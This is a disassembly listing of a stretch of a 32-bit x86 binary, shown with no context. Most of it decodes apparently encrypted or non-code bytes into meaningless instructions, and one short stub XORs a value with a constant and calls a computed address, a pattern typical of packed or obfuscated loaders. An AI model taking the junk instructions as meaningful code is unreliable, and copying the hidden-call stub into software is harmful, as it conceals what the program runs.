  416234:	xchg   edi,eax
  416235:	aam    0x84
  416237:	mov    ch,0x85
  416239:	jmp    0x88863773
  41623e:	pop    ecx
  41623f:	into   
  416240:	adc    edx,DWORD PTR [edi+0x30]
  416243:	test   BYTE PTR [ebx-0x71568766],cl
  416249:	xchg   ebp,eax
  41624a:	jbe    0x4161f6
  41624c:	add    eax,0x2f5dadd9
  416251:	xchg   esi,eax
  416252:	(bad)  
  416253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416254:	cs rol esp,cl
  416257:	je     0x4161e4
  416259:	xor    al,0x8
  41625b:	(bad)  
  41625c:	out    0x7e,al
  41625e:	iret   
  41625f:	(bad)  
  416260:	mov    cl,0x45
  416262:	jns    0x41624b
  416264:	scas   eax,DWORD PTR es:[edi]
  416265:	push   cs
  416266:	call   DWORD PTR [edx-0x4ae9f2d4]
  41626c:	xlat   BYTE PTR ds:[ebx]
  41626d:	retf   
  41626e:	add    dl,dh
  416270:	xor    al,0x4f
  416272:	xor    dl,bh
  416274:	popa   
  416275:	cmc    
  416276:	or     eax,0xc7bc84b4
  41627b:	xor    BYTE PTR [esi-0x67ac2142],dl
  416281:	mov    edx,DWORD PTR [ecx-0x415f552]
  416287:	(bad)  
  416288:	mov    esp,0xa5683fc9
  41628d:	leave  
  41628e:	add    edx,edi
  416290:	pop    eax
  416291:	pop    eax
  416292:	fsubr  st,st(6)
  416294:	es iret 
  416296:	out    dx,al
  416297:	push   ebp
  416298:	push   edx
  416299:	mov    dl,0x45
  41629b:	ds adc edi,ebx
  41629e:	cmp    edx,edi
  4162a0:	mov    dh,0xf7
  4162a2:	jecxz  0x416241
  4162a4:	xor    ch,BYTE PTR [esi-0x38]
  4162a7:	leave  
  4162a8:	(bad)  
  4162a9:	aad    0xa6
  4162ab:	jnp    0x416285
  4162ad:	lahf   
  4162ae:	and    al,0x84
  4162b0:	in     eax,0x36
  4162b2:	nop
  4162b3:	or     DWORD PTR [esi-0x48],0xfffffffe
  4162b7:	sbb    bl,BYTE PTR ds:0x9ad46c4b
  4162bd:	jle    0x416273
  4162bf:	call   0xcb57fb75
  4162c4:	out    0xe7,al
  4162c6:	dec    ebx
  4162c7:	ins    BYTE PTR es:[edi],dx
  4162c8:	cmc    
  4162c9:	adc    DWORD PTR [ebp+esi*4+0x69],esi
  4162cd:	xlat   BYTE PTR ds:[ebx]
  4162ce:	je     0x4162b6
  4162d0:	out    0xc0,al
  4162d2:	std    
  4162d3:	add    DWORD PTR [esi],0xffffffa3
  4162d6:	push   ss
  4162d7:	adc    edi,ebp
  4162d9:	dec    edi
  4162da:	mov    eax,0xfc0fbb07
  4162df:	dec    edi
  4162e0:	scas   al,BYTE PTR es:[edi]
  4162e1:	or     edx,DWORD PTR [eax+0x1c]
  4162e4:	xchg   ebx,eax
  4162e5:	call   0x68e32e72
  4162ea:	dec    eax
  4162eb:	sar    DWORD PTR [esi+0x3b],1
  4162ee:	or     BYTE PTR [esi-0x319f07e8],dh
  4162f4:	std    
  4162f5:	mov    edi,0xad5166f7
  4162fa:	cmp    BYTE PTR [ecx+ebp*2-0x4b],bh
  4162fe:	pop    ecx
  4162ff:	jle    0x41636d
  416301:	adc    eax,0x1aad1c5
  416306:	sub    bp,WORD PTR [ebx+0x38240d4a]
  41630d:	popf   
  41630e:	push   edi
  41630f:	ins    BYTE PTR es:[edi],dx
  416310:	je     0x41630a
  416312:	cmp    DWORD PTR [edi],ebx
  416314:	dec    ecx
  416315:	lahf   
  416316:	addr16 push ds
  416318:	cmp    esi,0x26
  41631b:	ret    
  41631c:	jb     0x4162b9
  41631e:	push   0x2947af28
  416323:	or     eax,0x41268b8a
  416328:	sbb    eax,0xa1b9d04a
  41632e:	pxor   mm4,QWORD PTR [edi]
  416331:	jno    0x4162e0
  416333:	stos   BYTE PTR es:[edi],al
  416334:	loope  0x4162ed
  416336:	cmp    eax,0x5ce3b7be
  41633c:	aaa    
  41633d:	mov    bl,0x9d
  41633f:	call   0x960:0x7af9950e
  416346:	jb     0x4163a4
  416348:	cmp    DWORD PTR [esi+eax*2],esi
  41634b:	adc    eax,0x2c2147a4
  416350:	int    0x8a
  416352:	ja     0x416351
  416354:	sub    ah,ah
  416356:	ins    BYTE PTR es:[edi],dx
  416357:	shl    BYTE PTR [edx+0x3e2bc193],1
  41635d:	daa    
  41635e:	pop    ecx
  41635f:	mov    eax,0x7c6d54c0
  416364:	dec    esp
  416365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416366:	lds    edx,FWORD PTR [edx+0x14]
  416369:	mov    esi,0x4d8b1b5c
  41636e:	or     BYTE PTR [ebp+0x729c0a8c],cl
  416374:	xor    al,BYTE PTR [eax]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x8ab8c841
  4163bf:	enter  0x13d1,0x14
  4163c3:	jg     0x416435
  4163c5:	mov    ecx,0xe570707e
  4163ca:	push   cs
  4163cb:	sub    bl,al
  4163cd:	fsub   DWORD PTR [edx+ebp*4]
  4163d0:	push   es
  4163d1:	data16 fcom QWORD PTR [edx+ecx*4]
  4163d5:	push   ecx
  4163d6:	and    BYTE PTR [ebx+0x10],0x97
  4163da:	(bad)  
  4163db:	pop    ebx
  4163dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163dd:	dec    esp
  4163de:	mov    cl,0x33
  4163e0:	hlt    
  4163e1:	cmp    al,BYTE PTR [esi-0x4514c89b]
  4163e7:	inc    ecx
  4163e8:	je     0x41636b
  4163ea:	loope  0x41643d
  4163ec:	inc    eax
  4163ed:	aad    0x8c
  4163ef:	dec    edi
  4163f0:	mov    edx,DWORD PTR [ecx+0x4e3d8db4]
  4163f6:	mov    al,ds:0x68925402
  4163fb:	pop    edi
  4163fc:	lods   al,BYTE PTR ds:[esi]
  4163fd:	retf   0xfbc2
  416400:	scas   eax,DWORD PTR es:[edi]
  416401:	fld    TBYTE PTR ds:0xf5a75aad
  416407:	push   ecx
  416408:	cld    
  416409:	jns    0x416406
  41640b:	mov    ah,0xe7
  41640d:	push   0xcdb466cc
  416412:	pusha  
  416413:	sub    BYTE PTR [eax],ch
  416415:	push   ecx
  416416:	mov    bl,0x8e
  416418:	adc    al,0xd9
  41641a:	adc    al,0x30
  41641c:	or     al,0x4a
  41641e:	retf   0x7b29
  416421:	xor    DWORD PTR [edx+edi*1-0x65],0x70c0950a
  416429:	sahf   
  41642a:	cmc    
  41642b:	adc    DWORD PTR [esi-0x1],ebx
  41642e:	aaa    
  41642f:	neg    BYTE PTR [edx+0x33706ff1]
  416435:	fnstenv ds:0x9f3b1fda
  41643b:	adc    bh,ch
  41643d:	arpl   WORD PTR [ebp+eax*2-0x86ceae9],bp
  416444:	stos   BYTE PTR es:[edi],al
  416445:	push   ecx
  416446:	retf   0x8014
  416449:	imul   esp,DWORD PTR [eax-0x65cd2023],0x14352dd2
  416453:	xor    esi,DWORD PTR [edi]
  416455:	ja     0x416403
  416457:	inc    eax
  416458:	sar    BYTE PTR [edi],0x80
  41645b:	ins    BYTE PTR es:[edi],dx
  41645c:	outs   dx,DWORD PTR ds:[esi]
  41645d:	sbb    eax,0x7ae1ead8
  416462:	adc    al,0xe7
  416464:	fwait
  416465:	loope  0x416490
  416467:	xchg   BYTE PTR [edi],ah
  416469:	imul   esp,ecx,0x7843059b
  41646f:	adc    eax,0x626999d8
  416474:	ret    
  416475:	repnz mov ebx,0x4eb5679e
  41647b:	lods   al,BYTE PTR ds:[esi]
  41647c:	push   esi
  41647d:	dec    esp
  41647e:	jb     0x416442
  416480:	sbb    BYTE PTR [edx],0xd8
  416483:	mov    WORD PTR [ecx-0x26],es
  416486:	sbb    DWORD PTR [ebp+0x19],esp
  416489:	mov    ecx,0x6c4df939
  41648e:	idiv   DWORD PTR [ebx+0x1f26becc]
  416494:	inc    ebp
  416495:	adc    BYTE PTR [ebx+0x1],ah
  416498:	jecxz  0x4164f2
  41649a:	xchg   ebx,eax
  41649b:	shl    BYTE PTR ds:0xa7e320c9,1
  4164a1:	(bad)  
  4164a2:	outs   dx,BYTE PTR ds:[esi]
  4164a3:	jnp    0x41646f
  4164a5:	dec    edi
  4164a6:	sbb    al,0x6
  4164a8:	jmp    0xba81ece
  4164ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164ae:	mov    ?,WORD PTR [esi]
  4164b0:	pop    ss
  4164b1:	outs   dx,BYTE PTR ds:[esi]
  4164b2:	push   ss
  4164b3:	or     bh,BYTE PTR [eax+0x2470bccf]
  4164b9:	mul    DWORD PTR [edi+0x5]
  4164bc:	rol    ah,cl
  4164be:	or     eax,0x78f23bf8
  4164c3:	imul   BYTE PTR [ebp-0x22b91db6]
  4164c9:	sbb    eax,0xcc677b31
  4164ce:	repnz xlat BYTE PTR ds:[ebx]
  4164d0:	popa   
  4164d1:	lock mov ebp,0x7f479eb7
  4164d7:	ins    BYTE PTR es:[edi],dx
  4164d8:	(bad)  
  4164d9:	and    edi,DWORD PTR [esi-0x98e8532]
  4164df:	sbb    DWORD PTR [edx+0x75],esp
  4164e2:	pop    ss
  4164e3:	fnstenv [eax+0x78]
  4164e6:	push   ecx
  4164e7:	leave  
  4164e8:	cli    
  4164e9:	jbe    0x4164d3
  4164eb:	inc    ebp
  4164ec:	push   esi
  4164ed:	out    0x13,al
  4164ef:	cli    
  4164f0:	std    
  4164f1:	popa   
  4164f2:	retf   0x6c3c
  4164f5:	in     al,0xb0
  4164f7:	or     bh,BYTE PTR [esi+0x64b01a85]
  4164fd:	iret   
  4164fe:	xor    BYTE PTR [eax-0x58],ah
  416501:	popf   
  416502:	mov    al,ds:0xc4c0aa34
  416507:	push   eax
  416508:	xchg   esi,eax
  416509:	or     ch,ah
  41650b:	xor    ebp,DWORD PTR [ecx+0x6e]
  41650e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41650f:	ja     0x41649c
  416511:	add    eax,0x2867c92e
  416516:	lahf   
  416517:	push   ss
  416518:	nop
  416519:	adc    dh,0xd7
  41651c:	jecxz  0x41649e
  41651e:	(bad)  
  41651f:	fiadd  WORD PTR [edx-0xe59013f]
  416525:	and    eax,0x2823d41a
  41652a:	jmp    0x416540
  41652c:	adc    BYTE PTR [ecx],dh
  41652e:	retf   
  41652f:	mov    ecx,0xa31a4bc2
  416534:	aas    
  416535:	lock jp 0x4164e9
  416538:	and    ebp,eax
  41653a:	sub    cl,BYTE PTR [edi]
  41653c:	mov    al,ds:0x1c41bae9
  416541:	jecxz  0x41651d
  416543:	cmp    bh,BYTE PTR [esp+edi*4-0x7ae248e3]
  41654a:	test   eax,0xe203ba41
  41654f:	stos   BYTE PTR es:[edi],al
  416550:	xchg   ebx,eax
  416551:	rcr    DWORD PTR fs:[edi],0xdf
  416555:	aad    0x8e
  416557:	les    eax,FWORD PTR [ecx+0x59]
  41655a:	dec    ecx
  41655b:	mov    esi,0xcbbed83b
  416560:	lods   al,BYTE PTR gs:[esi]
  416562:	iret   
  416563:	pop    es
  416564:	out    dx,al
  416565:	retf   0x1487
  416568:	mov    dl,BYTE PTR [edx+0x1]
  41656b:	push   0x3
  41656d:	xor    BYTE PTR [eax+eiz*4+0x3e4fbb5b],al
  416574:	shr    DWORD PTR [esi+ebp*1-0x4844c058],0xf2
  41657c:	mov    edi,0xb71bac91
  416581:	inc    ebp
  416582:	sub    eax,0xcf15837b
  416587:	pop    esp
  416588:	inc    ebx
  416589:	push   esi
  41658a:	sar    BYTE PTR ds:0x35864652,cl
  416590:	(bad)  [esi]
  416592:	xchg   esi,eax
  416593:	shl    BYTE PTR [edx+esi*8-0x105fd0e7],1
  41659a:	push   edi
  41659b:	sbb    bh,cl
  41659d:	and    al,BYTE PTR [ebx+edx*2]
  4165a0:	xor    ah,BYTE PTR [ebp-0x4c]
  4165a3:	add    DWORD PTR [eax],0x73cd1767
  4165a9:	pushf  
  4165aa:	pushf  
  4165ab:	popf   
  4165ac:	lods   al,BYTE PTR ds:[esi]
  4165ad:	mov    edx,0x9315a6aa
  4165b2:	in     eax,dx
  4165b3:	push   ecx
  4165b4:	xor    ebp,esp
  4165b6:	in     eax,dx
  4165b7:	fcmovu st,st(1)
  4165b9:	scas   eax,DWORD PTR es:[edi]
  4165ba:	lods   eax,DWORD PTR ds:[esi]
  4165bb:	sub    DWORD PTR [ebx+0x52c8e6a1],0xffffffca
  4165c2:	pop    edx
  4165c3:	add    bl,bl
  4165c5:	xor    ah,0x73
  4165c8:	cmp    eax,0x6bfe63e6
  4165cd:	mov    eax,ds:0xe58904e9
  4165d2:	push   ss
  4165d3:	push   es
  4165d4:	pop    DWORD PTR [ecx+0x1afe8618]
  4165da:	out    0xe5,al
  4165dc:	add    BYTE PTR [eax+0x724dc50b],dl
  4165e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165e3:	aad    0xf1
  4165e5:	mov    cs,WORD PTR ds:0xf4385696
  4165eb:	test   eax,0xff9a17b7
  4165f0:	dec    esi
  4165f1:	outs   dx,DWORD PTR ds:[esi]
  4165f2:	scas   al,BYTE PTR es:[edi]
  4165f3:	push   0xffffff9d
  4165f5:	lea    esp,[edx-0x1603593a]
  4165fb:	jle    0x41665c
  4165fd:	call   0x8be5361a
  416602:	jecxz  0x41665f
  416604:	jmp    0xfe1c385a
  416609:	(bad)  
  41660a:	into   
  41660b:	ja     0x41666c
  41660d:	xchg   edi,eax
  41660e:	(bad)  
  41660f:	jl     0x4165bf
  416611:	jmp    0xaaba167b
  416616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416617:	pop    esi
  416618:	inc    esi
  416619:	fsub   DWORD PTR [edx+0x5]
  41661c:	lods   al,BYTE PTR ds:[esi]
  41661d:	xor    BYTE PTR cs:[eax],cl
  416620:	jbe    0x416603
  416622:	popf   
  416623:	fs or  eax,0x18f51721
  416629:	add    ch,BYTE PTR [ebx+edx*1+0xa]
  41662d:	(bad)  
  41662e:	xchg   ecx,eax
  41662f:	jl     0x416674
  416631:	je     0x4165dc
  416633:	fiadd  DWORD PTR [eax]
  416635:	dec    edi
  416636:	das    
  416637:	out    0x4f,eax
  416639:	jno    0x41664f
  41663b:	push   ds
  41663c:	jno    0x416639
  41663e:	jl     0x416685
  416640:	gs repnz pop ebx
  416643:	mov    dl,0x48
  416645:	or     cl,BYTE PTR [ebx-0x272d40fc]
  41664b:	shl    al,0x40
  41664e:	imul   edi,DWORD PTR [edx],0x63491b37
  416654:	sbb    ebx,DWORD PTR cs:[esi+0x46d287f6]
  41665b:	jmp    0x793e13fb
  416660:	test   BYTE PTR [edi],ch
  416662:	inc    ebp
  416663:	(bad)  
  416665:	dec    ecx
  416666:	push   esp
  416667:	(bad)  
  416668:	rcr    DWORD PTR [eax+0x3c],cl
  41666b:	test   eax,0x69f95a32
  416670:	fldenv [eax+edx*2]
  416673:	int    0x10
  416675:	jle    0x41666f
  416677:	movntq QWORD PTR [ecx+0x5be31f5d],mm0
  41667e:	pusha  
  41667f:	or     al,0xe8
  416681:	jno    0x41668a
  416683:	jl     0x416630
  416685:	pusha  
  416686:	arpl   WORD PTR [edx+0x2d],dx
  416689:	stc    
  41668a:	inc    esp
  41668b:	xor    BYTE PTR [ecx-0x64],cl
  41668e:	mov    bl,0x5a
  416690:	xchg   edx,eax
  416691:	push   0xa
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x41667e
  4166ae:	push   eax
  4166af:	pop    eax
  4166b0:	call   0x70c07911
  4166b5:	mov    ecx,0xd670707e
  4166ba:	mov    es,WORD PTR [edi-0x30d98468]
  4166c0:	arpl   WORD PTR [edx-0x6d],dx
  4166c3:	sub    cl,BYTE PTR [esi-0x4bc2f03d]
  4166c9:	jnp    0x416672
  4166cb:	sti    
  4166cc:	adc    BYTE PTR [edi],dl
  4166ce:	add    eax,0xcb4d4d9b
  4166d3:	stc    
  4166d4:	mov    eax,0xe2205836
  4166d9:	scas   eax,DWORD PTR es:[edi]
  4166da:	stos   DWORD PTR es:[edi],eax
  4166db:	enter  0xcf0e,0x90
  4166df:	loop   0x41669e
  4166e1:	test   al,0x70
  4166e3:	call   0xf4c079dd
  4166e8:	int3   
  4166e9:	fst    QWORD PTR [ebx+0x40c9c272]
  4166ef:	sbb    eax,0xbfc7372e
  4166f4:	pop    ecx
  4166f5:	or     ebx,edx
  4166f7:	push   esp
  4166f8:	mov    esi,0xab8d7acf
  4166fd:	mov    ebx,0xa32f1c66
  416702:	cmp    eax,0x6c062f41
  416707:	arpl   WORD PTR [edi-0x45],sp
  41670a:	push   ebp
  41670b:	test   bh,0x1b
  41670e:	test   DWORD PTR [ebp+0x38],ebp
  416711:	xor    al,0x5d
  416713:	hlt    
  416714:	fyl2xp1 
  416716:	push   edi
  416717:	xchg   ebp,eax
  416718:	xor    al,0xaa
  41671a:	fnstenv [ebx-0x411dd4]
  416720:	mov    eax,0xdd5cbac4
  416725:	loop   0x416760
  416727:	(bad)  
  416728:	iret   
  416729:	arpl   WORD PTR [edi+0x5f27f579],cx
  41672f:	fidivr DWORD PTR [ebp+0x52c3db2a]
  416735:	ins    BYTE PTR es:[edi],dx
  416736:	dec    esp
  416737:	mov    ecx,0x18dcc93e
  41673c:	fcomp  QWORD PTR [eax]
  41673e:	shl    DWORD PTR [ebp-0x26803d9d],0x8
  416745:	xor    ah,BYTE PTR [esi]
  416747:	dec    ebp
  416748:	lods   eax,DWORD PTR ds:[esi]
  416749:	(bad)  
  41674a:	or     eax,0x6a7fa02d
  41674f:	jnp    0x416777
  416751:	int3   
  416752:	mov    cs,WORD PTR [ebp+0x5f]
  416755:	in     eax,0x74
  416757:	dec    ebx
  416758:	loop   0x4167d5
  41675a:	push   edx
  41675b:	arpl   WORD PTR [ecx],di
  41675d:	push   cs
  41675e:	xchg   DWORD PTR [eax-0x3f9d8630],ebp
  416764:	(bad)  
  416765:	and    eax,0x3b5ff979
  41676a:	jns    0x4166f2
  41676c:	mov    bh,0x67
  41676e:	mov    cl,0x20
  416770:	das    
  416771:	sar    DWORD PTR [edx],cl
  416773:	jg     0x416788
  416775:	cmp    al,0x8f
  416777:	icebp  
  416778:	adc    eax,0x2462a910
  41677d:	dec    ebx
  41677e:	iret   
  41677f:	in     eax,dx
  416780:	and    eax,0x8ec64848
  416785:	adc    eax,0xfb5d67a7
  41678a:	call   0xf231:0x6bfcccf7
  416791:	test   BYTE PTR [ecx],ch
  416793:	pop    esp
  416794:	jns    0x41676a
  416796:	or     esp,0x72
  416799:	into   
  41679a:	and    ecx,DWORD PTR [edx]
  41679c:	in     al,dx
  41679d:	lock push DWORD PTR [eax]
  4167a0:	dec    esp
  4167a1:	clc    
  4167a2:	out    0x36,al
  4167a4:	inc    ebx
  4167a5:	pop    ecx
  4167a6:	mov    esp,fs
  4167a8:	loope  0x416777
  4167aa:	pop    ss
  4167ab:	lea    edx,ds:[ebp+0x42bd0322]
  4167b2:	sub    DWORD PTR [edx-0x133d0311],0xffffffa4
  4167b9:	xchg   esi,eax
  4167ba:	into   
  4167bb:	sub    DWORD PTR [edi+0x536713cb],edi
  4167c1:	jne    0x41677f
  4167c3:	ja     0x416798
  4167c5:	jb     0x416830
  4167c7:	fist   WORD PTR [ecx+0x6c]
  4167ca:	fnstenv [edx-0x1a]
  4167cd:	push   esp
  4167ce:	mov    ebp,DWORD PTR [esi-0x3]
  4167d1:	jb     0x4167f0
  4167d3:	int    0x68
  4167d5:	push   esi
  4167d6:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4167d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167d9:	pop    esp
  4167da:	sub    al,0x65
  4167dc:	aas    
  4167dd:	arpl   si,sp
  4167df:	cmp    DWORD PTR [ebx-0x60],ecx
  4167e2:	xchg   ebx,eax
  4167e3:	ss and ah,dh
  4167e6:	bound  ebp,QWORD PTR [edi+0x2d4be1e7]
  4167ec:	jmp    0x6714:0x38b23e91
  4167f3:	(bad)  
  4167f4:	adc    edi,DWORD PTR [ebp-0x2635d5c8]
  4167fa:	push   ecx
  4167fb:	ror    BYTE PTR [ebx],cl
  4167fd:	loopne 0x416827
  4167ff:	imul   ebx,DWORD PTR [ecx],0x548c90fd
  416805:	inc    ecx
  416806:	mov    al,ds:0xb752e7c2
  41680b:	jmp    0x41684d
  41680d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41680e:	xor    BYTE PTR [esi-0x64ec125f],ch
  416814:	adc    DWORD PTR [ebp+edi*1+0x67ecb5f7],ebx
  41681b:	xor    DWORD PTR [edi+0x5acee741],0xffffff99
  416822:	mov    al,ds:0x7f75e682
  416827:	jo     0x4167ca
  416829:	jns    0x416869
  41682b:	test   eax,0x78e49e6
  416830:	push   edi
  416831:	pop    edi
  416832:	or     eax,0x7957411c
  416837:	fmul   DWORD PTR [ebx+0x1a567454]
  41683d:	sbb    DWORD PTR [edx+0x418ce32d],edx
  416843:	aas    
  416844:	jbe    0x4167da
  416846:	sub    dl,BYTE PTR [ecx-0x58]
  416849:	jb     0x416824
  41684b:	push   edx
  41684c:	mov    bh,0xaa
  41684e:	(bad)  
  41684f:	dec    esp
  416851:	scas   eax,DWORD PTR es:[edi]
  416852:	jae    0x41688b
  416854:	inc    ebp
  416855:	popa   
  416856:	dec    esi
  416857:	cmp    BYTE PTR [ecx],ah
  416859:	mov    BYTE PTR [edx+eax*2+0x1ff753a8],bh
  416860:	mov    ch,0x66
  416862:	rcl    BYTE PTR [ebp-0x46e955c0],1
  416868:	out    dx,al
  416869:	fs inc edx
  41686b:	stos   DWORD PTR es:[edi],eax
  41686c:	and    esi,DWORD PTR [eax-0x29a959dc]
  416872:	hlt    
  416873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416874:	dec    esp
  416875:	loopne 0x41686b
  416877:	jg     0x416887
  416879:	sub    BYTE PTR [ebx],bl
  41687b:	into   
  41687c:	dec    ebp
  41687d:	adc    ebx,DWORD PTR [esi-0x32a6db2a]
  416883:	std    
  416884:	ret    
  416885:	stos   DWORD PTR es:[edi],eax
  416886:	xor    eax,0x54ad3f9a
  41688b:	imul   ebx,DWORD PTR [edi+0x7c],0x8
  41688f:	jns    0x416869
  416891:	pop    ds
  416892:	push   0x71
  416894:	mov    ah,0x1c
  416896:	idiv   DWORD PTR [ecx-0x281a147a]
  41689c:	fincstp 
  41689e:	xchg   ebx,eax
  41689f:	je     0x41686f
  4168a1:	rol    edi,0x5f
  4168a4:	shl    dh,cl
  4168a6:	pop    esp
  4168a7:	das    
  4168a8:	dec    ebx
  4168a9:	iret   
  4168aa:	sahf   
  4168ab:	shl    DWORD PTR [eax-0x23e3ea75],1
  4168b1:	out    dx,eax
  4168b2:	push   cs
  4168b3:	mov    ch,0x32
  4168b5:	pop    es
  4168b6:	les    ebp,FWORD PTR [esi+0x7c269f7f]
  4168bc:	mov    fs,WORD PTR [esi]
  4168be:	xchg   edi,eax
  4168bf:	and    ecx,ebx
  4168c1:	loope  0x416942
  4168c3:	add    ebp,DWORD PTR [ebx+0x8c99576]
  4168c9:	dec    edx
  4168ca:	mov    bl,0x8a
  4168cc:	call   0xdb95:0xb220c661
  4168d3:	cmp    DWORD PTR [ebx-0x76749a67],ebx
  4168d9:	dec    BYTE PTR [ebx]
  4168db:	and    DWORD PTR [edx+0xe],ebx
  4168de:	inc    ebx
  4168df:	xor    eax,0xf4427e19
  4168e4:	sbb    DWORD PTR [ebx-0x36f7185f],esp
  4168ea:	cld    
  4168eb:	aas    
  4168ec:	ret    0x6d1f
  4168ef:	mov    edx,0x3e50c24f
  4168f4:	push   esp
  4168f5:	mov    BYTE PTR [ebp-0x1178bd45],dh
  4168fb:	push   esi
  4168fc:	cmp    eax,0xbbbe1c3b
  416901:	jae    0x41693d
  416903:	mov    bh,0xda
  416905:	stc    
  416906:	jnp    0x416890
  416908:	or     BYTE PTR [ecx],dl
  41690a:	call   0x8c5d1266
  41690f:	clc    
  416910:	mov    esp,0xf56529a5
  416915:	sbb    dh,dl
  416917:	mov    ch,0x46
  416919:	sbb    ebp,DWORD PTR [eax]
  41691b:	loop   0x41690c
  41691d:	in     eax,dx
  41691e:	push   0x71da3a57
  416923:	push   0xffffff94
  416925:	or     eax,0x48b4790a
  41692a:	div    DWORD PTR [edx-0x18]
  41692d:	sbb    al,0xbc
  41692f:	ret    0x4eb
  416932:	fwait
  416933:	es je  0x416987
  416936:	icebp  
  416937:	fisttp QWORD PTR [ebx]
  416939:	fist   DWORD PTR [edi-0x54]
  41693c:	div    DWORD PTR [ebx+edx*8+0x68249aaa]
  416943:	fnsave fs:[edi-0x53]
  416947:	xchg   edx,eax
  416948:	test   BYTE PTR [ebx],0xfd
  41694b:	out    0xb9,al
  41694d:	cmp    eax,0x22b6a094
  416952:	retf   
  416953:	or     ebp,DWORD PTR [edi-0x5deddd81]
  416959:	xor    dh,BYTE PTR [ecx+0x7c2a6c29]
  41695f:	fst    QWORD PTR [edx]
  416961:	clc    
  416962:	cli    
  416963:	dec    esp
  416964:	sbb    eax,0x44795632
  416969:	mov    edi,0xf481ee86
  41696e:	xor    DWORD PTR [ecx+eiz*8-0x2fd84043],edi
  416975:	jbe    0x4169e0
  416977:	js     0x4169e5
  416979:	lahf   
  41697a:	jo     0x4169f2
  41697c:	xchg   edx,eax
  41697d:	in     eax,dx
  41697e:	dec    eax
  41697f:	rol    DWORD PTR [edi+0x2dfe9cb],0x0
  416986:	add    ch,dh
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	ret    0x9629
  416996:	out    0xa5,al
  416998:	pop    ds
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0x7e70707e
  4169a0:	add    eax,0xcb74d867
  4169a5:	(bad)  
  4169a6:	dec    BYTE PTR [eax]
  4169a8:	jmp    0x4169a1
  4169aa:	(bad)  
  4169ac:	pop    ecx
  4169ad:	pop    esp
  4169ae:	jge    0x416977
  4169b0:	push   edi
  4169b1:	cwde   
  4169b2:	test   DWORD PTR [esi],ecx
  4169b4:	cs push ds
  4169b6:	mov    edi,0x985763da
  4169bb:	adc    BYTE PTR [edx],al
  4169bd:	ss (bad) 
  4169bf:	in     al,dx
  4169c0:	jge    0x41695b
  4169c2:	push   esp
  4169c3:	mov    dh,0x9f
  4169c5:	jle    0x41699a
  4169c7:	xchg   edi,eax
  4169c8:	pop    ebp
  4169c9:	stc    
  4169ca:	cs pop es
  4169cc:	inc    edx
  4169cd:	test   BYTE PTR [esi],al
  4169cf:	movzx  ebx,ch
  4169d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169d3:	add    DWORD PTR [ebx-0x50cf5886],eax
  4169d9:	gs out 0x2,al
  4169dc:	push   es
  4169dd:	push   edx
  4169de:	mov    ecx,0x8ef6b35e
  4169e3:	inc    esp
  4169e4:	mov    ds:0x7a78b707,al
  4169e9:	adc    edi,eax
  4169eb:	inc    ebx
  4169ec:	mov    al,0x2
  4169ee:	mov    esp,0x66d0d852
  4169f3:	mov    cl,0xd
  4169f5:	push   edi
  4169f6:	inc    esp
  4169f7:	pop    ss
  4169f8:	push   cs
  4169f9:	jmp    0x30319338
  4169fe:	or     DWORD PTR [ebx-0x4],ebx
  416a01:	jnp    0x416987
  416a03:	sub    al,0x13
  416a05:	mov    edx,0xa45a2643
  416a0a:	je     0x416a6b
  416a0c:	push   es
  416a0d:	mov    al,BYTE PTR [ebx+ecx*1+0x1a]
  416a11:	adc    al,0xb2
  416a13:	call   0x7ff6:0x80a534c2
  416a1a:	cdq    
  416a1b:	sub    BYTE PTR [edi+0x39369c70],ch
  416a21:	xor    al,0xc2
  416a23:	jecxz  0x416a7c
  416a25:	lods   eax,DWORD PTR ds:[esi]
  416a26:	sub    eax,0xf976f54b
  416a2b:	fsubr  st(0),st
  416a2d:	push   ecx
  416a2e:	jo     0x4169c5
  416a30:	pop    es
  416a31:	mov    esp,DWORD PTR [esi+0x10de820e]
  416a37:	outs   dx,BYTE PTR ds:[esi]
  416a38:	lods   al,BYTE PTR ds:[esi]
  416a39:	ret    
  416a3a:	shl    BYTE PTR [ebx+ebp*8+0x52],cl
  416a3e:	sub    BYTE PTR [ebx+ebx*8],0x6
  416a42:	je     0x416a05
  416a44:	mov    eax,ecx
  416a46:	sbb    BYTE PTR [ebx-0x55c5c68b],dl
  416a4c:	cmp    eax,DWORD PTR [edx]
  416a4e:	jle    0x416acf
  416a50:	mov    ds:0x914093ba,eax
  416a55:	sbb    BYTE PTR [edi-0xd],ch
  416a58:	mov    ch,0xcf
  416a5a:	sbb    eax,0xd07e0507
